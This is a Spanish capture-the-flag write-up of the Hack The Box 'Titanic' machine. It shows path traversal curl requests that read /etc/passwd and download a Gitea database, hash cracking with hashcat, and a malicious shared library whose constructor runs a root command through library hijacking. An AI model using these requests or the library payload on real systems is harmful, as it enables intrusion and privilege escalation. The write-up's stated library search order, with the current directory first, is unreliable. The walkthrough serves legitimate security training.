---
title: Titanic - Hackthebox - Season 7
date: 2025-02-17 11:00:00 +0000
layout: post
permalink: /writeups/HTB/LABS/titanic-htb
categories: [Labs & CTF, Write Up, Hackthebox]
tags: [Linux, CTF] 
image:
  path: /assets/img/writeups/hackthebox/titanic_htb/cabecera.png
  alt: Titanic - Hackthebox - Season 7
description: >
  Titanic - Hackthebox - Season7 - Guía en español
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Escaneo de puertos

```bash
❯ nmap --open -sV -sC -Pn 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 22:36 CET
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Titanic - Book Your Ship Trip
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.39 seconds
```

Nos encontramos un servidor web y acceso por SSH.

# Enumerando subdominios

Para enumerar los subdominios, vamos a utilizar el siguiente comando:

```bash
❯ gobuster dns -d titanic.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     titanic.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dev.titanic.htb

Progress: 320 / 4990 (6.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 320 / 4990 (6.41%)
===============================================================
Finished
===============================================================
```

Encontramos un subdominio llamado dev.titanic.htb.

# Visitando la pagina web principal

Al añadir el dominio a nuestro etc/hosts, podemos acceder a la web.

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image.png)

Parece ser una web para reservar tickets de viaje en el Titanic.

Al crear un ticket, nos descarga  un json con los datos introducidos por el usuario.

# Visitando el subdominio dev.titanic.htb

Al añadir el subdominio a nuestro etc/hosts, podemos acceder a la web.

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-1.png)

Encontramos algo interesante, parecen los archivos de configuración de la web servidos de forma pública sin necesidad de autenticación.

## Repositorio docker-config

Podemos encontrar dos ficheros de configuración para los servicios de GitTea y MYSQL.

### GitTea

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-2.png)

Lo interesante es la potencial ruta por defecto de los datos de GitTea.

### Mysql

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-3.png)

Aquí tenemos las credenciales de acceso a la base de datos.

## Repositorio Flask-config

Encontramos el codigo de la aplicación Flask que se ejecuta en el servidor web.

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-4.png)

```python
from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

TICKETS_DIR = "tickets"

if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

Si observamos el código podemos ver como se maneja la creación de tickets y la descarga de los mismos.

Parecce que toma el input de los campos y crea un fichero json con el contenido de los datos introducidos sin filtrar nada, crea un fichero con un uid pseudo-aleatorio y lo guarda en el directorio tickets.

Para descargar el ticcket utiliza un GET al que se le indica el uid del ticket con un ticket=<uid>.json. y esto, si existe en el directorio tickets, lo descarga, pero no existe ningún tipo de filtrado.

# Explotando el Path Traversal

Sabiendo que el servicio web que realiza la descarga de los tickets no filtra el valor que se le pasa, vamos a intentar explotarlo.

```bash
❯ curl 'http://titanic.htb/download?ticket=../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Parece que efectivamente tenemos un ataque de Path Taversal y de este archivo etc/passwd vemos que solo hay dos usuarios que parecen útiles, el usuario developer y el usuario root.

Como vimos antes en el subdominio dev.titanic.htb, el usuario developer es el que tenia los repositorios docker-config y Flask-config creados.

El usuario que está ejecutando el servicio web Flask es el usuario www-data pero podemos probar a ver a qué ficheros tenemos acceso.

## User flag

Probando la ubicación tipica de la flag de usuario, efectivamente tenemos acceso a la carpeta `/home/developer`

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-5.png)

Esto significa que si como vimos antes la ruta por defecto de gittea es `/home/developer/gitea/data` quizá tengamos acceso a la base de datos de gitea y por ende a la contraseña de la cuenta developer.

## Base de datos de Gitea

```bash
❯ curl 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/gitea.db' --output gitea.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2036k  100 2036k    0     0   287k      0  0:00:07  0:00:07 --:--:--  321k
```

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-6.png)

Efectivamente tenemos acceso a la base de datos de gitea y podemos ver que la contraseña de la cuenta developer pero está hasheada.

### Cracking la contraseña

Investigando como se GitTea hashea la contraseña en su base de datos econtré un script que podría ser útil para crackear la contraseña.

[GitHub](https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271)

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-7.png)

Vemos diferentes hashes, creamos un fichero con todos ellos.

Ahora indicamos a hashcat que el hash lleva el username delante e intentamos crackearlos.

```bash
hashcat --username hash.txt /usr/share/wordlists/rockyou.txt
```

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-8.png)

Ya que tenemos la contraseña podemos probar acceso por SSH con el usuario developer.

## Escalando privilegios

Una vez que hayamos entrado por SSH, podemos ejecutar linpeas para buscar posibles caminos de escalar privilegios.

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-9.png)

Tenemos una ruta de ficheros creados por root que pueden ser leidos por developer.

Todos ellos forman parte de la aplicación web Flask y son manejados por el proceso de flask.service que es ejecutado por root.

- Propiedad:

    - Propietario: root
    - Grupo: developer

- Permisos:

    - drwx (propietario/root): lectura, escritura y ejecución
    - rwx (grupo/developer): lectura, escritura y ejecución

Sabiendo esto podemos llegar a la siguiente conclusión:

- Revisando el código encontrado en el repositorio Flask-config observamos que estos directorios no existen pues son creados posteriormente a la ejecución del servicio web Flask.

- Como vemos son creados por root pero también por el grupo developer, pero por qué son creados por root. ¿A caso son recargados o manejados por este?

- ¿Cómo podemos escalar privilegios?

### Modificación de librerías

Suponiendo que root está supervisando el servicio web flask con respecto a la modificación o creación de imágenes en esta ruta, podemos intentar modificar la librería de python que se utiliza para manejar las imágenes en X11.

Sabiendo también que Linux busca las bibliotecas compartidas en este orden:

- Directorio actual (.)
- LD_LIBRARY_PATH
- /etc/ld.so.cache
- Directorios del sistema (/lib, /usr/lib)

Podemos crear una librería maliciosa en la que se ejecute un comando para obtener la flag.

```bash
cd /opt/app/static/assets/images/
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root.txt");
    exit(0);
}
EOF
```

Hemos creado una librería maliciosa en la ruta `/opt/app/static/assets/images/` que cuando se cargue, ejecuta un comando para obtener la flag.

Ahora podemos forzar la carga de la librería visitando la web por ejemplo.

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-10.png)

Ahora si podemos ver la flag root.txt en la ruta /tmp/.

![alt text](/assets/img/writeups/hackthebox/titanic_htb/image-11.png)

Esta es una técnica de "Library Hijacking" o "Library Preloading", donde se aprovecha que:

- Linux busca bibliotecas compartidas en cierto orden
- Si podemos escribir en alguno de esos directorios
- Un proceso root carga esa biblioteca
- Podemos hacer que ejecute nuestro código como root